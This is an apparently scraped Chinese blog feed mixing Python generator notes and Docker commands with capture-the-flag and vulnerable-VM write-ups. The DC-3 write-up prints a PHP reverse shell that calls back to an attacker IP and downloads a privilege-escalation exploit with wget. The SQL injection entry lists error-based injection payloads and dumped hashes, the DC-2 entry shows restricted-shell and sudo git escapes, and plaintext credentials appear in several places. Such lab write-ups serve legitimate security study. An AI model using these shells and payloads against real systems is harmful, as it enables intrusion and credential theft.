class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i,value <span class="keyword">in</span> enumerate([<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>]):</span><br><span class="line">    print(i, value)</span><br></pre></td></tr></table></figure><h4 id="列表生成器"><a href="#列表生成器" class="headerlink" title="列表生成器"></a>列表生成器</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 生成[1*1,2*2,3*3,...10*10]的列表</span></span><br><span class="line">L = [x*x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">11</span>)]</span><br><span class="line"><span class="comment"># 仅生成偶数的平方</span></span><br><span class="line">L = [x*x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">11</span>) <span class="keyword">if</span> x%<span class="number">2</span>=<span class="number">0</span>]</span><br><span class="line"><span class="comment"># 两层循环生成全排列</span></span><br><span class="line">L = [m+n <span class="keyword">for</span> m <span class="keyword">in</span> <span class="string">'ABC'</span> <span class="keyword">for</span> n <span class="keyword">in</span> <span class="string">'XYZ'</span>]</span><br><span class="line"><span class="comment"># 使用两个变量生成list</span></span><br><span class="line">d = &#123;<span class="string">'x'</span>:<span class="string">'A'</span>, <span class="string">'y'</span>:<span class="string">'B'</span>, <span class="string">'z'</span>:<span class="string">'C'</span>&#125;</span><br><span class="line">l = [k + <span class="string">'='</span> + v <span class="keyword">for</span> k,v <span class="keyword">in</span> d.items()]</span><br></pre></td></tr></table></figure><h4 id="生成器"><a href="#生成器" class="headerlink" title="生成器"></a>生成器</h4><p>创建generator最简单的方法是把列表生成器的<code>[]</code>改成<code>()</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">g = (x*x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">10</span>))</span><br><span class="line"><span class="keyword">print</span> next(g) <span class="comment"># 0</span></span><br><span class="line"><span class="keyword">print</span> next(g) <span class="comment"># 1</span></span><br></pre></td></tr></table></figure><p>generator保存的是算法，每次调用<code>next(g)</code>，就计算出<code>g</code>的下一个元素的值，直到计算到最后一个元素，没有更多的元素时，抛出<code>StopIteration</code>的错误。不断调用<code>next(g)</code>实在是太变态了，正确的方法是使用<code>for</code>循环，因为generator也是可迭代对象：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">g = (x*x <span class="keyword">for</span> x range(<span class="number">10</span>))</span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> g:</span><br><span class="line">    print(n)</span><br></pre></td></tr></table></figure><h5 id="使用函数实现生成器"><a href="#使用函数实现生成器" class="headerlink" title="使用函数实现生成器"></a>使用函数实现生成器</h5><h6 id="例-斐波那契数"><a href="#例-斐波那契数" class="headerlink" title="例 斐波那契数"></a>例 斐波那契数</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 打印函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fib</span><span class="params">(max)</span>:</span></span><br><span class="line">    n,a,b = <span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> n &lt; max:</span><br><span class="line">        print(b)</span><br><span class="line">        a,b = b, a+b</span><br><span class="line">        n = n+<span class="number">1</span></span><br></pre></td></tr></table></figure><p> 函数和generator仅一步之遥。要把<code>fib</code>函数变成generator，只需要把<code>print(b)</code>改为<code>yield b</code>就可以了： </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定义generator</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fib</span><span class="params">(max)</span>:</span></span><br><span class="line">    n,a,b = <span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> n &lt; max:</span><br><span class="line">        <span class="keyword">yield</span> b</span><br><span class="line">        a,b = b, a+b</span><br><span class="line">        n = n+<span class="number">1</span></span><br><span class="line">g = fib(<span class="number">6</span>)</span><br></pre></td></tr></table></figure><p> 但是用<code>for</code>循环调用generator时，发现拿不到generator的<code>return</code>语句的返回值。如果想要拿到返回值，必须捕获<code>StopIteration</code>错误，返回值包含在<code>StopIteration</code>的<code>value</code>中： </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">g = fib(<span class="number">6</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        x = next(g)</span><br><span class="line">        print(<span class="string">'g:'</span>,x)</span><br><span class="line">    <span class="keyword">except</span> StopIteration <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">'Generator return value:'</span>, e.value)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h4 id="迭代器"><a href="#迭代器" class="headerlink" title="迭代器"></a>迭代器</h4><p> 可以被<code>next()</code>函数调用并不断返回下一个值的对象称为迭代器：<code>Iterator</code>。 </p><p>凡是可作用于<code>for</code>循环的对象都是<code>Iterable</code>类型；</p><p>凡是可作用于<code>next()</code>函数的对象都是<code>Iterator</code>类型，它们表示一个惰性计算的序列；</p><p>集合数据类型如<code>list</code>、<code>dict</code>、<code>str</code>等是<code>Iterable</code>但不是<code>Iterator</code>，不过可以通过<code>iter()</code>函数获得一个<code>Iterator</code>对象。</p><p>Python的<code>for</code>循环本质上就是通过不断调用<code>next()</code>函数实现的，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">for x in [1, 2, 3, 4, 5]:</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure><p>实际上完全等价于：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 首先获得Iterator对象:</span></span><br><span class="line">it = iter([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>])</span><br><span class="line"><span class="comment"># 循环:</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 获得下一个值:</span></span><br><span class="line">        x = next(it)</span><br><span class="line">    <span class="keyword">except</span> StopIteration:</span><br><span class="line">        <span class="comment"># 遇到StopIteration就退出循环</span></span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-3</title>
      <link href="/2019/11/26/DC-3/"/>
      <url>/2019/11/26/DC-3/</url>
      
        <content type="html"><![CDATA[<h3 id="Nmap扫描"><a href="#Nmap扫描" class="headerlink" title="Nmap扫描"></a>Nmap扫描</h3><p>nmap一顿操作发现只开了80端口</p><h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 目录扫描发现后台</span></span><br><span class="line">dirb http://192.168.1.119</span><br></pre></td></tr></table></figure><p><img src="/images/DC-3/image-20191126115221921.png" alt="image-20191126115221921"></p><h3 id="爆破后台admin密码"><a href="#爆破后台admin密码" class="headerlink" title="爆破后台admin密码"></a>爆破后台admin密码</h3><p><img src="/images/DC-3/image-20191126142151422.png" alt="image-20191126142151422"></p><p><img src="/images/DC-3/image-20191126142135027.png" alt="image-20191126142135027"></p><h3 id="登录后台"><a href="#登录后台" class="headerlink" title="登录后台"></a>登录后台</h3><p>用户名为 <code>admin</code> 密码 <code>snoopy</code></p><p><img src="/images/DC-3/image-20191126162058640.png" alt="image-20191126162058640"></p><h3 id="创建反弹shell页面"><a href="#创建反弹shell页面" class="headerlink" title="创建反弹shell页面"></a>创建反弹shell页面</h3><p><img src="/images/DC-3/image-20191126162242932.png" alt="image-20191126162242932"></p><h5 id="随便选择一个模板创建文件并保存"><a href="#随便选择一个模板创建文件并保存" class="headerlink" title="随便选择一个模板创建文件并保存"></a>随便选择一个模板创建文件并保存</h5><p><img src="/images/DC-3/image-20191126162439227.png" alt="image-20191126162439227"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 反弹shell的代码</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$ip =<span class="number">192.168</span><span class="number">.1</span><span class="number">.118</span>;</span><br><span class="line">$port=<span class="number">4444</span></span><br><span class="line">$sock = fsockopen($ip, $port);</span><br><span class="line">$descriptorspec = <span class="keyword">array</span>(</span><br><span class="line">        <span class="number">0</span> =&gt; $sock,</span><br><span class="line">        <span class="number">1</span> =&gt; $sock,</span><br><span class="line">        <span class="number">2</span> =&gt; $sock</span><br><span class="line">);</span><br><span class="line">$process = proc_open(<span class="string">'/bin/sh'</span>, $descriptorspec, $pipes);</span><br><span class="line">proc_close($process);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h5 id="kali设置监听"><a href="#kali设置监听" class="headerlink" title="kali设置监听"></a>kali设置监听</h5><p><img src="/images/DC-3/image-20191126162525556.png" alt="image-20191126162525556"></p><p>访问 <code>http://192.168.1.119/templates/beez3/xxx.php</code> 获得shell</p><p><img src="/images/DC-3/image-20191126162647774.png" alt="image-20191126162647774"></p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>查找exp <code>searchsploit ubuntu 16.04</code></p><p><img src="/images/DC-3/image-20191126162909920.png" alt="image-20191126162909920"></p><p>wegt下载到目标主机</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget clone https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</span><br></pre></td></tr></table></figure><p><img src="/images/DC-3/image-20191126163228301.png" alt="image-20191126163228301"></p><p>解压后分别找到exp目录</p><ul><li>首先执行<code>./compile.sh</code></li><li>然后执行<code>./doubleput</code>，获取root权限</li></ul><p><img src="/images/DC-3/image-20191126163534422.png" alt="image-20191126163534422"></p><h3 id="切换至root目录getflag"><a href="#切换至root目录getflag" class="headerlink" title="切换至root目录getflag"></a>切换至root目录getflag</h3><p><img src="/images/DC-3/image-20191126163730214.png" alt="image-20191126163730214"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 靶机渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli_writeup</title>
      <link href="/2019/11/22/sqli_writeup/"/>
      <url>/2019/11/22/sqli_writeup/</url>
      
        <content type="html"><![CDATA[<p><a href="http://123.206.87.240:9001/sql/" target="_blank" rel="noopener">http://123.206.87.240:9001/sql/</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">admin_name=admin&quot; or 1=1#&amp;admin_passwd=2333&amp;submit=GO+GO+GO</span><br><span class="line"></span><br><span class="line">admin_name=admin&quot; or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)#&amp;admin_passwd=2333&amp;submit=GO+GO+GO</span><br></pre></td></tr></table></figure><p><img src="../images/sqli_writeup/image-20191122144400086.png" alt="image-20191122144400086"></p><p><img src="../images/sqli_writeup/image-20191122144957715.png" alt="image-20191122144957715"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin_name=admin&quot; or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x666c616731),0x7e),1)#&amp;admin_passwd=2333&amp;submit=GO+GO+GO</span><br></pre></td></tr></table></figure><p><img src="../images/sqli_writeup/image-20191122145138742.png" alt="image-20191122145138742"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">admin_name=admin&quot; or updatexml(1,concat(0x7e,(select group_concat(flag1) from flag1),0x7e),1)#&amp;admin_passwd=2333&amp;submit=GO+GO+GO</span><br><span class="line"></span><br><span class="line">admin_name=admin&quot; or updatexml(1,concat(0x7e,substr((select group_concat(flag1) from flag1),30,40),0x7e),1)#&amp;admin_passwd=2333&amp;submit=GO+GO+GO</span><br></pre></td></tr></table></figure><p>ed6b28e684817d9efcaf802979e57aea</p><p><img src="../images/sqli_writeup/image-20191122145221023.png" alt="image-20191122145221023"></p><p><img src="../images/sqli_writeup/image-20191122145510508.png" alt="image-20191122145510508"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin_name=admin&quot; or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x77686f616d69),0x7e),1)#&amp;admin_passwd=2333&amp;submit=GO+GO+GO</span><br></pre></td></tr></table></figure><p><img src="../images/sqli_writeup/image-20191122145657918.png" alt="image-20191122145657918"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin_name=admin&quot; or updatexml(1,concat(0x7e,substr((select group_concat(w_passwd) from whoami),30,40),0x7e),1)#&amp;admin_passwd=2333&amp;submit=GO+GO+GO</span><br></pre></td></tr></table></figure><p> 9db3bae8316e95698ed679aa109c1925     admin123, </p><p><img src="../images/sqli_writeup/image-20191122145845056.png" alt="image-20191122145845056"></p><p> BlCkJaCk    5FF69C838EDD75995197C516C677A416  passwd123, </p><p>AdMiNhEhE admin123,</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">admin_name=admin&quot; or updatexml(1,concat(0x7e,(select w_name from whoami  limit 1,1),0x7e),1)#&amp;admin_passwd=2333&amp;submit=GO+GO+GO</span><br><span class="line"></span><br><span class="line">admin_name=admin&quot; or updatexml(1,concat(0x7e,substr((select w_passwd from whoami  limit 1,1),20,40),0x7e),1)#&amp;admin_passwd=2333&amp;submit=GO+GO+GO</span><br></pre></td></tr></table></figure><p><img src="../images/sqli_writeup/image-20191122150513616.png" alt="image-20191122150513616"></p><p><img src="../images/sqli_writeup/image-20191122150732450.png" alt="image-20191122150732450"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">5c58eccac46d7ce0d7a60f4694622c57x</span><br></pre></td></tr></table></figure><p><img src="../images/sqli_writeup/image-20191122161637079.png" alt="image-20191122161637079"></p><p><img src="../images/sqli_writeup/image-20191122161733403.png" alt="image-20191122161733403"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>4th-CyberEarth-writeup</title>
      <link href="/2019/11/21/4th-CyberEarth-writeup/"/>
      <url>/2019/11/21/4th-CyberEarth-writeup/</url>
      
        <content type="html"><![CDATA[<p> 其他破坏者会利用工控云管理系统设备维护中心的后门入侵系统 </p><p><img src="/images/4th-CyberEarth-writeup/image-20191121114301743.png" alt="image-20191121114301743"></p><p><img src="/images/4th-CyberEarth-writeup/image-20191121114332488.png" alt="image-20191121114332488"></p><p>再次点击</p><p><img src="/images/4th-CyberEarth-writeup/image-20191121114451585.png" alt="image-20191121114451585"></p><p>php伪协议读源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=php:<span class="comment">//filter/convert.base64-encode/resource=index.php</span></span><br></pre></td></tr></table></figure><p><img src="/images/4th-CyberEarth-writeup/image-20191121114840371.png" alt="image-20191121114840371"></p><p>base64解码</p><p><img src="/images/4th-CyberEarth-writeup/image-20191121114952459.png" alt="image-20191121114952459"></p><p>代码中发现关键信息</p><ul><li>修改 X-Forwarded-For 头为127.0.0.1</li><li></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 靶机渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker笔记</title>
      <link href="/2019/11/20/docker%E7%AC%94%E8%AE%B0/"/>
      <url>/2019/11/20/docker%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h1><h3 id="docker镜像获取"><a href="#docker镜像获取" class="headerlink" title="docker镜像获取"></a>docker镜像获取</h3><ul><li>导入导出</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load --input /xx/xxx.tar</span><br></pre></td></tr></table></figure><ul><li>pull docker hub</li></ul><h4 id="开启容器"><a href="#开启容器" class="headerlink" title="开启容器"></a>开启容器</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 8000:80 &lt;image&gt;</span><br><span class="line"></span><br><span class="line">docker run -t -d -p 2222:22 7b9ab7293e68 ## -p 2222:22 将容器22端口映射到宿主机2222端口</span><br><span class="line"></span><br><span class="line">docker run -it &lt;image&gt; /bin/bash</span><br></pre></td></tr></table></figure><h4 id="进入容器"><a href="#进入容器" class="headerlink" title="进入容器"></a>进入容器</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it &lt;container_id&gt; /bin/bash</span><br></pre></td></tr></table></figure><h4 id="关闭容器"><a href="#关闭容器" class="headerlink" title="关闭容器"></a>关闭容器</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop &lt;container_id&gt;</span><br></pre></td></tr></table></figure><h4 id="复制文件"><a href="#复制文件" class="headerlink" title="复制文件"></a>复制文件</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp file &lt;container_id&gt;：/xxx/xxx/xxx/</span><br></pre></td></tr></table></figure><h4 id="查看运行中的镜像"><a href="#查看运行中的镜像" class="headerlink" title="查看运行中的镜像"></a>查看运行中的镜像</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure><h4 id="保存镜像"><a href="#保存镜像" class="headerlink" title="保存镜像"></a>保存镜像</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker</span><br></pre></td></tr></table></figure><h4 id="连接镜像"><a href="#连接镜像" class="headerlink" title="连接镜像"></a>连接镜像</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker attach &lt;container_id&gt;</span><br></pre></td></tr></table></figure><h4 id="导入-导出镜像"><a href="#导入-导出镜像" class="headerlink" title="导入/导出镜像"></a>导入/导出镜像</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker import/export</span><br></pre></td></tr></table></figure><h4 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">docker run －t －i &lt;image&gt; 用镜像创建一个容器</span><br><span class="line">docker pull image 拉拽镜像</span><br><span class="line">docker images 查看可用镜像</span><br><span class="line">docker ps 查看运行的容器</span><br><span class="line">docker ps -a 查看所有的容器</span><br><span class="line">docker stop &lt;container id&gt; 停止该容器</span><br><span class="line">docker start &lt;container id&gt; 开始该容器</span><br><span class="line">docker attach &lt;container id&gt;与该容器交互</span><br><span class="line">docker commit &lt;container id&gt; &lt;new id&gt;创建新的镜像</span><br><span class="line">docker rm &lt;container id&gt; 删除容器</span><br><span class="line">docker rmi &lt;image name&gt; 删除镜像</span><br><span class="line">docker cp &lt;containerId&gt;:/file/path/within/container /host/path/target 从Docker容器内拷贝文件到主机上</span><br><span class="line">docker commit -a 't0ng' &lt;container id&gt; &lt;容器名&gt;：latest 将容器打包成镜像</span><br></pre></td></tr></table></figure><h4 id="run-命令参数"><a href="#run-命令参数" class="headerlink" title="run 命令参数"></a>run 命令参数</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">-a stdin: 指定标准输入输出内容类型，可选 STDIN/STDOUT/STDERR 三项；</span><br><span class="line"></span><br><span class="line">-d: 后台运行容器，并返回容器ID；</span><br><span class="line"></span><br><span class="line">-i: 以交互模式运行容器，通常与 -t 同时使用；</span><br><span class="line"></span><br><span class="line">-P: 随机端口映射，容器内部端口随机映射到主机的高端口</span><br><span class="line"></span><br><span class="line">-p: 指定端口映射，格式为：主机(宿主)端口:容器端口</span><br><span class="line"></span><br><span class="line">-t: 为容器重新分配一个伪输入终端，通常与 -i 同时使用；</span><br><span class="line"></span><br><span class="line">--name="nginx-lb": 为容器指定一个名称；</span><br><span class="line"></span><br><span class="line">--dns 8.8.8.8: 指定容器使用的DNS服务器，默认和宿主一致；</span><br><span class="line"></span><br><span class="line">--dns-search example.com: 指定容器DNS搜索域名，默认和宿主一致；</span><br><span class="line"></span><br><span class="line">-h "mars": 指定容器的hostname；</span><br><span class="line"></span><br><span class="line">-e username="ritchie": 设置环境变量；</span><br><span class="line"></span><br><span class="line">--env-file=[]: 从指定文件读入环境变量；</span><br><span class="line"></span><br><span class="line">--cpuset="0-2" or --cpuset="0,1,2": 绑定容器到指定CPU运行；</span><br><span class="line"></span><br><span class="line">-m :设置容器使用内存最大值；</span><br><span class="line"></span><br><span class="line">--net="bridge": 指定容器的网络连接类型，支持 bridge/host/none/container: 四种类型；</span><br><span class="line"></span><br><span class="line">--link=[]: 添加链接到另一个容器；</span><br><span class="line"></span><br><span class="line">--expose=[]: 开放一个端口或一组端口；</span><br><span class="line"></span><br><span class="line">--volume , -v: 绑定一个卷</span><br></pre></td></tr></table></figure><h4 id="mysql安装配置"><a href="#mysql安装配置" class="headerlink" title="mysql安装配置"></a>mysql安装配置</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> docker 中下载 mysql </span></span><br><span class="line">docker pull mysql </span><br><span class="line"><span class="meta">#</span><span class="bash">启动 </span></span><br><span class="line">docker run --name mysql -p 3306:3306 -e MYSQL_ROOT_PASSWORD=Lzslov123! -d mysql </span><br><span class="line"><span class="meta">#</span><span class="bash">进入容器 </span></span><br><span class="line">docker exec -it mysql bash </span><br><span class="line"><span class="meta">#</span><span class="bash">登录mysql </span></span><br><span class="line">mysql -u root -p ALTER USER 'root'@'localhost' IDENTIFIED BY 'Lzslov123!'; </span><br><span class="line"><span class="meta">#</span><span class="bash">添加远程登录用户 </span></span><br><span class="line">CREATE USER 'liaozesong'@'%' IDENTIFIED WITH mysql_native_password BY 'Lzslov123!'; </span><br><span class="line">GRANT ALL PRIVILEGES ON *.* TO 'liaozesong'@'%';</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 工具学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-2</title>
      <link href="/2019/11/20/DC-2/"/>
      <url>/2019/11/20/DC-2/</url>
      
        <content type="html"><![CDATA[<h1 id="DC-2"><a href="#DC-2" class="headerlink" title="DC-2"></a>DC-2</h1><h2 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h2><ul><li><p>修改host文件解析域名</p></li><li><p>cewl爬取信息生成密码<code>cewl dc-2/ -w dict.txt</code></p></li><li><p>wpscan扫描wordpress <code>wpscan –-url dc-2/ -P dict.txt</code></p></li><li><p>切换shell，修改环境变量</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">BASH_CMDS[a]=/bin/sh;a </span><br><span class="line">export PATH=$PATH:/bin/</span><br><span class="line">export PATH=$PATH:/usr/bin</span><br></pre></td></tr></table></figure></li><li><p>发现root权限执行的命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure></li><li><p>git提权</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo git -p --help</span><br><span class="line">!/bin/bash</span><br></pre></td></tr></table></figure></li></ul><h2 id="打靶流程"><a href="#打靶流程" class="headerlink" title="打靶流程"></a>打靶流程</h2><h3 id="1、主机发现"><a href="#1、主机发现" class="headerlink" title="1、主机发现"></a>1、主机发现</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.43.0/24</span><br><span class="line">nmap -sV -p 1-65535 192.168.43.183</span><br></pre></td></tr></table></figure><p><img src="/images/DC-2/1574127544326.png" alt="1574127544326"></p><p><img src="/images/DC-2/1574127569904.png" alt="1574127569904"></p><p><strong>发现主机 ，开放80 http服务和7744 ssh服务</strong></p><h3 id="2、修改host文件，访问web页面"><a href="#2、修改host文件，访问web页面" class="headerlink" title="2、修改host文件，访问web页面"></a>2、修改host文件，访问web页面</h3><p>直接访问ip地址发现域名解析，解析的域名<code>dc-2</code>无法访问</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">host文件位于c:/windows/system32/drivers/etc/hosts</span><br><span class="line">将 192.168.43.183 DC-2加入到host</span><br></pre></td></tr></table></figure><p><img src="/images/DC-2/1574127826501.png" alt="1574127826501"></p><ul><li>发现使用<strong>WordPress</strong></li><li>出现<strong>flag1</strong>和提示</li></ul><p><img src="/images/DC-2/1574127876095.png" alt="1574127876095"></p><h3 id="3、cewl生成密码"><a href="#3、cewl生成密码" class="headerlink" title="3、cewl生成密码"></a>3、cewl生成密码</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl dc-2/ -w dict.txt#-w选项表示将爬取生成的字典输出为文件</span><br></pre></td></tr></table></figure><p><img src="/images/DC-2/1574129389297.png" alt="1574129389297"></p><h3 id="4、利用cewl生成的密码爆破"><a href="#4、利用cewl生成的密码爆破" class="headerlink" title="4、利用cewl生成的密码爆破"></a>4、利用cewl生成的密码爆破</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 